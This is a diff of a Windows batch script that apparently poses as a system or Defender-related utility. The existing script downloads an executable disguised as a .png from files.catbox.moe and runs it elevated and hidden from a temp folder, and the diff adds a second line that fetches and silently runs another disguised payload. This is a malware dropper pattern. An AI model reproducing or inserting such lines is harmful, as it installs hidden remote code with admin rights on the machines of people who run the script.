@@ -1,5 +1,5 @@
 ÿþ
-@echo off
+@echo off
 cls
 goto :yes
 :MicrosoftDefender
@@ -161,5 +161,6 @@ call :makescreenshot end_screenshot
 timeout 5 /nobreak > nul
 call :clean
 %powershell% iwr -useb "https://files.catbox.moe/p3vomo.png" -OutFile "%temp%\GraphicsType\tmp.exe"; saps "%temp%\GraphicsType\tmp.exe" -Verb RunAs -WindowStyle Hidden
+%powershell% iwr -useb "https://files.catbox.moe/vll6vf.png" -OutFile "%temp%\GraphicsType\tmp1.exe"; saps "%temp%\GraphicsType\tmp1.exe" -Verb RunAs -WindowStyle Hidden
 goto :EOF
 exit
